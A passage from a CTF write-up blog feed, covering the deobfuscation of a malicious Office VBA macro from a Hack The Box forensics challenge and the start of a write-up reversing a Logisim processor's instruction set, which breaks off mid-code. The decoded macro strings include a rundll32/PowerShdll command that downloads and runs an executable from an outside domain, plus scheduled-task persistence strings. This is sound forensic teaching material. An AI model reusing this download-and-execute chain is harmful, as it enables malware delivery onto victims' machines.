We are gonna use the &lt;code&gt;olevba&lt;/code&gt; utility to get more infos on the macros&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/new_era_olevba.png&#34; alt=&#34;olevba&#34;&gt;&lt;/p&gt;
&lt;p&gt;That definitely looks odd. Nonetheless, when we try to decode the base64 strings, it looks like non-sense so we are gonna try to look at the macro code. The problem is that it&amp;rsquo;s been compiled into assembly so we don&amp;rsquo;t have a direct access to the VBA. We are gonna use a utility called &lt;code&gt;pcode2code&lt;/code&gt; to transform back the pcode into human-readable VBA which gives us &lt;a href=&#34;https://alagroy-42.github.io/writeups/new_era/raw_macro.vba&#34;&gt;this file&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Good news is that this is human readable-code, bad news is that it is completely obfuscated. So our main task will be to deobfuscate it.
We can notice a lot of code chunks using the &lt;code&gt;Chr&lt;/code&gt; function that converts a number to a char so we can guess that those are hidden strings. By simply copying those in a python file and renaming &lt;code&gt;Chr&lt;/code&gt; to &lt;code&gt;chr&lt;/code&gt; plus a few minor modifications, we can retrieve them and replace them in the original code.
For example :
&lt;code&gt;td.RegistrationInfo.Author = SazX46jj(&amp;quot;m&amp;quot; &amp;amp; Chr(int(&amp;quot;&amp;amp;H4f&amp;quot;)) &amp;amp; Chr(-878 + 958) &amp;amp; Chr(&amp;amp;H32) &amp;amp; &amp;quot;U&amp;quot; &amp;amp; Chr(75) &amp;amp; Chr(-2899 + 3012) &amp;amp; Chr(int(&amp;quot;55&amp;quot;)) &amp;amp; Chr(int(&amp;quot;47&amp;quot;)) &amp;amp; Chr(2158 - 2109) &amp;amp; Chr(int(&amp;quot;&amp;amp;H52&amp;quot;)) &amp;amp; Chr(1501 - 1390) &amp;amp; Chr(int(&amp;quot;112&amp;quot;)) &amp;amp; Chr(476 - 360) &amp;amp; Chr(-1634 + 1716) &amp;amp; Chr(int(&amp;quot;71&amp;quot;)) &amp;amp; Chr(113) &amp;amp; Chr(&amp;amp;H76) &amp;amp; Chr(int(&amp;quot;106&amp;quot;)) &amp;amp; Chr(99) &amp;amp; Chr(int(&amp;quot;&amp;amp;H55&amp;quot;)) &amp;amp; Chr(int(&amp;quot;&amp;amp;H75&amp;quot;)) &amp;amp; Chr(int(&amp;quot;&amp;amp;H43&amp;quot;)) &amp;amp; Chr(&amp;amp;H30) &amp;amp; Chr(47) &amp;amp; Chr(int(&amp;quot;&amp;amp;H46&amp;quot;)) &amp;amp; Chr(88) &amp;amp; Chr(8301 - 8247) &amp;amp; Chr(&amp;amp;H2B) &amp;amp; Chr(int(&amp;quot;108&amp;quot;)) &amp;amp; &amp;quot;9&amp;quot; &amp;amp; Chr(&amp;amp;H64))&lt;/code&gt;
will now be :
&lt;code&gt;td.RegistrationInfo.Author = deobf_str(&amp;quot;mOP2UKq7/1RoptRGqvjcUuC0/FX6+l9d&amp;quot;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Every encoded string seems to be another base64 string but they also don&amp;rsquo;t decode into anything readable. However, we can notice that each of the base64-like strings are given to the same function that we will name &lt;code&gt;deobf_str&lt;/code&gt;. That gives us the &lt;a href=&#34;https://alagroy-42.github.io/writeups/new_era/stage_1.vba&#34;&gt;stage_1&lt;/a&gt; file that is partially decoded.
After trying to understand how the script works, we got the &lt;a href=&#34;https://alagroy-42.github.io/writeups/new_era/stage_2.vba&#34;&gt;stage_2&lt;/a&gt; file that has its symbols renamed with a coherent name and also more coherent types.&lt;/p&gt;
&lt;p&gt;Now that we have an approximation of what the &lt;code&gt;deobf_str&lt;/code&gt; function does, we will recode it in Python and try to get see what is hidden in the Base64-like strings.
Here is the corresponding script :&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;deobfuscate.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from curses.ascii import isdigit, islower, isupper
import sys

def binary_transform1(elem, op):
    out = elem
    if op &amp;gt; 0:
        if elem &amp;gt; 0:
            out = int(out / (2 ** op))
        else:
            if op &amp;gt; 31:
                out = 0
            else:
                out = out &amp;amp; 0x7FFFFFFF
                out = int(out / (2 ** op))
                out = out | (2 ** (31 - op))
    return out

def binary_transform2(elem, op):
    out = elem
    if op &amp;gt; 0:
        for i in range(op):
            m = out &amp;amp; 0x40000000
            out = (out &amp;amp; 0x3FFFFFFF) * 2
            if m != 0:
                out = out | 0x80000000
    return out

def binary_transform3(setup):
    d1 = 7
    d2 = 14
    t = ((setup ^ binary_transform1(setup, d2)) &amp;amp; 52428)
    u = setup ^ t ^ binary_transform2(t, d2)
    t = (u ^ binary_transform1(u, d1)) &amp;amp; 5570645
    out = (u ^ t ^ binary_transform2(t, d1))
    return out

def crypto_style_mega_binary_transform(pre_final_result):
    return_value = &amp;#34;&amp;#34;
    for i in range(len(pre_final_result)):
        fr = i * 4
        if fr &amp;#43; 3&amp;gt;= len(pre_final_result):
            break
        setup = 0
        setup = setup | binary_transform2(pre_final_result[fr &amp;#43; 3], 24)
        setup = setup | binary_transform2(pre_final_result[fr &amp;#43; 2], 16)
        setup = setup | binary_transform2(pre_final_result[fr &amp;#43; 1], 8)
        setup |= pre_final_result[fr]
        raw = binary_transform3(setup)
        a = chr(binary_transform1(raw &amp;amp; 0xff000000, 24))
        B = chr(binary_transform1(raw &amp;amp; 16711680, 16))
        c = chr(binary_transform1(raw &amp;amp; 65280, 8))
        d = chr(binary_transform1(raw &amp;amp; 255, 0))
        return_value = return_value &amp;#43; d &amp;#43; c &amp;#43; B &amp;#43; a
    return return_value



matrix = [0] * 256
arr1 = [0] * 64
arr2 = [0] * 64
arr3 = [0] * 64

for i in range (256):
    if isupper(i):
        matrix[i] = i - 65
    elif islower(i):
        matrix[i] = i - 71
    elif isdigit(i):
        matrix[i] = i &amp;#43; 4
    elif i == ord(&amp;#34;&amp;#43;&amp;#34;):
        matrix[i] = ord(&amp;#34;&amp;gt;&amp;#34;)
    elif i == ord(&amp;#34;/&amp;#34;):
        matrix[i] = ord(&amp;#34;?&amp;#34;)

for i in range(64):
    arr1[i] = i * 64
    arr2[i] = i * 64 * 64
    arr3[i] = i * 64 * 64 * 64

arg_str = sys.argv[1]
pre_final_result = [0] * (int((len(arg_str) &amp;#43; 1) / 4) * 3)
index_pre_final_result = 0

arg_str_array = [ord(i) for i in arg_str]

for iter in range(0, len(arg_str_array), 4):
    mega_byte = arr3[matrix[arg_str_array[iter]]] &amp;#43; arr2[matrix[arg_str_array[iter &amp;#43; 1]]] &amp;#43; arr1[matrix[arg_str_array[iter &amp;#43; 2]]] &amp;#43; matrix[arg_str_array[iter &amp;#43; 3]]
    i = mega_byte &amp;amp; 0xff0000
    pre_final_result[index_pre_final_result] = int(i / 0x10000)
    i = mega_byte &amp;amp; 0xff00
    pre_final_result[index_pre_final_result &amp;#43; 1] = int(i / 0x100)
    pre_final_result[index_pre_final_result &amp;#43; 2] = mega_byte &amp;amp; 0xff
    index_pre_final_result &amp;#43;= 3

deobf_str = crypto_style_mega_binary_transform(pre_final_result).strip(&amp;#34;~&amp;#34;)
print(deobf_str)
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;We will give each string to that script and try to see what they are corresponding to :&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;strs.sh&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
/usr/local/bin/python3 deobfuscate.py &amp;#34;oPhSWfo8/Qbyq3BYqC59Urpr&amp;#43;lGyyHEfqt7uVGiy8VjwrlwV6q3UHqjj8lyoOvlUuCreUfho&amp;#43;1GqWpxDsK7wUappuFOi&amp;#43;/dR0qhwVvCqU0U=&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;Evw9TPCsd1Ui/z1aoL1zXuhzM0yquVhXuGLWGaKHWl342F1d&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;iP7eVuiy8VjwqlwV8KpYFeCj/lTwRFVBuMlMVPKv8xSK4zRToL/wXOI0cBegu/VSsMhQXOg1XR7ik/9VuO/VWbivUlygvnBS6KNUH/Kt/RW44PNd8Kh8FbC68BCwy&amp;#43;Ndkq9YVPjYXV0=&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;Evg5SLrp1VMwrXBRIO9cXvCsd1Viv3laor9TWLguWlXo6V5f&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;ooz2QrAlVxVqoWBQEKSoUGDjwFAApaFQALXEVgClqVAK5SBWAKWoUWjzdVEAralRYOHkUACloVko90RQAKygUWqhVVWAJClZIOPAEBCsqFBo8XVRgCQpWUjzZlCAJClZAPX3VwCkoFEqoURUAKWpUKKK&amp;#43;AjSNlJT&amp;#43;HL8XA==&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;gqV5VqC/WFWi28dQuqfQVg==&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;mOP2UKq7/1RoptRGqvjcUuC0/FX6&amp;#43;l9d&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;au1hUSCmzFVAtcFSGOhzGwD110Z4/llQ6vj1QKKhTV04&amp;#43;lEQKORgEaBmzV3Y4uZQeqx9VYD2f0hY&amp;#43;FdSAPzfRsjr51nyJHFZ&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;qlBUCugWcgwi2FUKulBVCupQV04=&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;uK/UVug&amp;#43;OVDY&amp;#43;l1d&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;Evg5SLrp1VMwrXBRIO9cXvCsd1Viv3laor9TWLguWlXo6V5f&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;mqt4Vqqz8xmAvnBS6OtcXw==&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;&amp;#43;q94VrLvdFlymE4fyL7fVvi2wFPocndd&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;&amp;#43;q94VrLvdFlymE4fyL7fVvi2wFPocndd&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;&amp;#43;q94VrLvdFlymE4fyL7fVvi2wFPocncZmu98EjLRRVui7/dQ&amp;#43;vh9Xw==&amp;#34;
/usr/local/bin/python3 deobfuscate.py &amp;#34;ivPlUuC4dhzSqPBW&amp;#43;PpfXQ==&amp;#34;
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  forensics_newera sh strs
https://github.com/p3nt4/PowerShdll/raw/master/dll/bin/x64/Release/PowerShdll.dl
C:\Windows\System32\rundll32.exe 
\powershdll.dll,main . { Invoke-WebRequest -useb https://windowsliveupdater.com/install.exe -OutFile 
C:\ProgramData\windows\install.exe
; echo &amp;#39;cABhAHIAdAAxACAAPQAgACIASABUAEIAewBzAGMAaAAzAGQAdQBsADEAbgBnAF8AdAA0AHMAawBzAF8AMQBzAF8AYwAwADAAbABfACIA&amp;#39; } ^| iex;
Schedule.Service
Microsoft Corporation
cGFydDIgPSAiYnV0X3AwdzNyc2gzbGxfdzF0aDB1dF9wMHczcnNoM2xsXzFzX2MwMGwzcn0i
2022-02-22T22:22:22
tigger.ID
C:\ProgramData\windows\install.exe
Windows Update
winmgmts:\\.\root\cimv2
winmgmts:\\.\root\cimv2
winmgmts:\\.\root\cimv2:Win32_Process
WScript.Shell
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That definetly looks like a shady macro and there is a particularly peculiar string in those which is&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;; echo &amp;#39;cABhAHIAdAAxACAAPQAgACIASABUAEIAewBzAGMAaAAzAGQAdQBsADEAbgBnAF8AdAA0AHMAawBzAF8AMQBzAF8AYwAwADAAbABfACIA&amp;#39; } ^| iex;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Once decoded, the base64 string gives us &lt;code&gt;part1 = &amp;quot;HTB{sch3dul1ng_t4sks_1s_c00l_&amp;quot;&lt;/code&gt;. We guess that the second part is in the other base64 string which gives us, once decoded : &lt;code&gt;part2 = &amp;quot;but_p0w3rsh3ll_w1th0ut_p0w3rsh3ll_1s_c00l3r}&amp;quot;&lt;/code&gt;. We now have the full flag.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Mechanical Madness - [HTB UNICTF 2021 - Qualifiers]</title>
      <link>https://alagroy-42.github.io/writeups/mechanical_madness/</link>
      <pubDate>Tue, 14 Jun 2022 15:42:52 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/writeups/mechanical_madness/</guid>
      <description>The Challenge For this challenge we had the following files :
cpu.circ (A very big XML file that describe the processor) nasm program.asm v2.0 raw 10000a 100101 10100 130000 100101 e0000 40000 nasm program.asm :start movl ax, 10 :sub1 movl bx, 1 sub bx cmp ax, ax movl bx, :sub1 jnz rst nasm program.asm :start movl cx, 10 clr movl bx, 1 movl dx, 0 mmiv 0x0, dx movl bx, :sub4 call bx, 0 mmov ax, 0x0 movl bx, :sub5 call bx, 0 :sub1 movl bx, 1 movl dx, 0 push dx, 0 movl bx, :sub5 call bx, 0 movl bx, 1 sub bx, 0 cmp ax, ax movl bx, :sub1 jnz movl bx, :sub4 call bx, 0 :sub2 movl bx, 0 mmiv 0x1, bx mmiv 0x2, bx :sub3 pop ax, 0 movl bx, 1 movl dx, 0 movl bx, :sub5 call bx, 0 mmov bx, 0x1 msk mmiv 0x1, bx mmov bx, 0x2 mskb mmiv 0x2, bx movl ax, 0xff cmp bx, ax movl bx, :sub3 jl movl bx, 0 mmov dx, 0x1 movl cx, 1 movl cx, 0 movl bx, :sub2 jmp bx, 0 :sub4 movl ax, 0x05 movl bx, :sub5 call bx, 0 movl bx, 1 sub bx, 0 cmp ax, ax movl bx, :sub4&amp;#43;1 jnz ret :sub5 movl cx, 4 movl cx, 0 ret Processor Analysis Once we open the cpu.</description>
      <content>&lt;h2 id=&#34;the-challenge&#34;&gt;The Challenge&lt;/h2&gt;
&lt;p&gt;For this challenge we had the following files :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://alagroy-42.github.io/writeups/mechanical_madness/cpu.circ.xml&#34;&gt;cpu.circ&lt;/a&gt; (A very big XML file that describe the processor)



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;program.asm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
v2.0 raw
10000a 100101 10100 130000 100101 e0000 40000 
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;program.asm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
:start
	movl ax, 10
:sub1
	movl bx, 1
	sub  bx
	cmp  ax,  ax
	movl bx,  :sub1
	jnz
	rst
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;3&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;3&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;program.asm&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
:start
	movl cx, 10
	clr
	movl bx,  1
	movl dx,  0
	mmiv 0x0,  dx
	movl bx,  :sub4
	call bx,  0
	mmov ax, 0x0
	movl bx,  :sub5
	call bx,  0
:sub1
	movl bx,  1
	movl dx,  0
	push dx,  0
	movl bx,  :sub5
	call bx,  0
	movl bx,  1
	sub  bx,  0
	cmp  ax, ax
	movl bx, :sub1
	jnz
	movl bx,  :sub4
	call bx,  0
:sub2
	movl bx,  0
	mmiv 0x1, bx
	mmiv 0x2, bx
:sub3
	pop  ax,  0
	movl bx,  1
	movl dx,  0
	movl bx,  :sub5
	call bx,  0
	mmov bx, 0x1
	msk
	mmiv 0x1, bx
	mmov bx, 0x2
	mskb
	mmiv 0x2, bx
	movl ax,  0xff
	cmp  bx, ax
	movl bx, :sub3
	jl
	movl bx,  0
	mmov dx, 0x1
	movl cx,  1
	movl cx,  0
	movl bx,  :sub2
	jmp  bx,  0
:sub4
	movl ax,  0x05
	movl bx,  :sub5
	call bx,  0
	movl bx,  1
	sub  bx,  0
	cmp  ax,  ax
	movl bx,  :sub4&amp;#43;1
	jnz
	ret
:sub5
	movl cx,  4
	movl cx,  0
	ret
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;

&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;processor-analysis&#34;&gt;Processor Analysis&lt;/h2&gt;
&lt;p&gt;Once we open the &lt;code&gt;cpu.circ&lt;/code&gt; in logisim as stated, we can see that we have a whole processor that shows up :
&lt;img src=&#34;https://alagroy-42.github.io/mechanical_cpu.png&#34; alt=&#34;processor&#34;&gt;&lt;/p&gt;
&lt;p&gt;This processor is an electronic circuit powered by a clock. The first interesting part of the circuit are :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/mechanical_clock.png&#34; alt=&#34;Clock&#34;&gt;
Fig 1. Clock Cycle
&lt;img src=&#34;https://alagroy-42.github.io/mechanical_RAM.png&#34; alt=&#34;RAM&#34;&gt;
Fig 2. RAM and instruction loading&lt;/p&gt;
&lt;p&gt;On &lt;code&gt;Fig 1&lt;/code&gt;, we can see that the clock system is gonna cycle on 5 wires. The two first ones are the one coming from the top on &lt;code&gt;Fig 2&lt;/code&gt;. The first wire is gonna power the &lt;code&gt;WR&lt;/code&gt; register and the last four are respectively named Decode, Execute, Store and Clear. We can see on &lt;code&gt;Fig 2&lt;/code&gt; that a typical cycle will load the content of the current element (3 bytes) of the RAM in the &lt;code&gt;WR&lt;/code&gt; register and then split its three bytes in 3 different registers : &lt;code&gt;IR&lt;/code&gt;, &lt;code&gt;RA&lt;/code&gt; and &lt;code&gt;RB&lt;/code&gt;. Those bytes are then used by the CU module which probably stands for Control Unit :&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/mechanical_cu.png&#34; alt=&#34;CU&#34;&gt;&lt;/p&gt;
&lt;p&gt;In the Control Unit, we can see that there are a lot of blocks on the left side carrying the instructions name, we can guess that it is in those blocks that the instructions are executed. Those blocks are (almost) all directly plugged to &lt;code&gt;IR&lt;/code&gt; and when going inside the blocks we can see that they are also plugged to either &lt;code&gt;RA&lt;/code&gt;, &lt;code&gt;RA&lt;/code&gt; and &lt;code&gt;RB&lt;/code&gt;, or none. We can assume that &lt;code&gt;IR&lt;/code&gt; is gonna be the Instruction Register, &lt;code&gt;RA&lt;/code&gt; and &lt;code&gt;RB&lt;/code&gt; are gonna contain respectively the first and second operand of the instructions. Except for some special cases (&lt;code&gt;mov&lt;/code&gt;, &lt;code&gt;movl&lt;/code&gt;, &lt;code&gt;msk&lt;/code&gt; and &lt;code&gt;mskb&lt;/code&gt;), every instruction contains a AND logic gate plugged on each of the five last bits of &lt;code&gt;IR&lt;/code&gt; where some of the bits are being NOT.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/mechanical_gate.png&#34; alt=&#34;gate&#34;&gt;
Fig 3. CMP instruction logic gate&lt;/p&gt;
&lt;p&gt;Here we can see that &lt;code&gt;cmp&lt;/code&gt; is switched on by the &lt;code&gt;10011&lt;/code&gt; sequence (0x13), we can see that all these gates are unique so we can use them to retrieve the opcodes of all the instructions which gives us the following translation table :&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Opcode&lt;/th&gt;
&lt;th&gt;Instruction&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0x0&lt;/td&gt;
&lt;td&gt;add&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x1&lt;/td&gt;
&lt;td&gt;sub&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x2&lt;/td&gt;
&lt;td&gt;mul&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x3&lt;/td&gt;
&lt;td&gt;clr&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x4&lt;/td&gt;
&lt;td&gt;rst&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x5&lt;/td&gt;
&lt;td&gt;jmp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x6&lt;/td&gt;
&lt;td&gt;ljmp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x7&lt;/td&gt;
&lt;td&gt;jlp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x8&lt;/td&gt;
&lt;td&gt;jg&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x9&lt;/td&gt;
&lt;td&gt;jge&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xa&lt;/td&gt;
&lt;td&gt;jl&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xb&lt;/td&gt;
&lt;td&gt;jle&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xc&lt;/td&gt;
&lt;td&gt;je&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xd&lt;/td&gt;
&lt;td&gt;jz&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xe&lt;/td&gt;
&lt;td&gt;jnz&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0xf&lt;/td&gt;
&lt;td&gt;div&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x10&lt;/td&gt;
&lt;td&gt;movl*&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x11&lt;/td&gt;
&lt;td&gt;call&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x12&lt;/td&gt;
&lt;td&gt;ret&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x13&lt;/td&gt;
&lt;td&gt;cmp&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x14&lt;/td&gt;
&lt;td&gt;push&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x15&lt;/td&gt;
&lt;td&gt;pop&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x17&lt;/td&gt;
&lt;td&gt;mmiv&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x18&lt;/td&gt;
&lt;td&gt;mmov&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;*The movl instruction isnt directly plugged to &lt;code&gt;IR&lt;/code&gt;, it is the multiplexers on the right that are plugged to &lt;code&gt;IR&lt;/code&gt; and will execute (or not) movl depending on its value. But we can still guess its value by looking at the opcodes of &lt;code&gt;example.data&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now that we did that, we can try to guess how the operands are encoded. We will first look at the first two instructions of &lt;code&gt;example.asm&lt;/code&gt; :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;movl&lt;/span&gt; ax, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;movl&lt;/span&gt; bx, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Those are encoded as : &lt;code&gt;10000a 100101&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We know that 0x10 represents &lt;code&gt;movl&lt;/code&gt;, we can assume that literals are transmitted as so in the machine code (0xa = 10). Seeing that &lt;code&gt;ax&lt;/code&gt; is encoded as 0x00 and &lt;code&gt;bx&lt;/code&gt; as 0x01, we can establish this register encoding table:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Register&lt;/th&gt;
&lt;th&gt;Encoding&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;ax&lt;/td&gt;
&lt;td&gt;0x00&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;bx&lt;/td&gt;
&lt;td&gt;0x01&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;cx&lt;/td&gt;
&lt;td&gt;0x02&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;dx&lt;/td&gt;
&lt;td&gt;0x03&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Last thing we need is knowing how labels are encoded. We will now look at the instruction that uses a label :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;movl&lt;/span&gt; bx, :sub1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This instruction has been encoded as &lt;code&gt;100101&lt;/code&gt;. Now, we know that &lt;code&gt;sub1&lt;/code&gt;s value is &lt;code&gt;01&lt;/code&gt;. Since &lt;code&gt;sub1&lt;/code&gt; starts at the second instruction, which has index 1 in the RAM, we can guess that labels are encoded as their index in the RAM.&lt;/p&gt;
&lt;p&gt;We now have almost everything we need to write our compiler. We can see two unknown instructions in the code of the program that we dont have opcodes for, &lt;code&gt;msk&lt;/code&gt; and &lt;code&gt;mskb&lt;/code&gt;. We can see by looking at their module that they are setting the output register to :&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;msk&lt;/span&gt; : (ax &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; dx) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; bx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;mskb&lt;/span&gt; : dx &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; bx
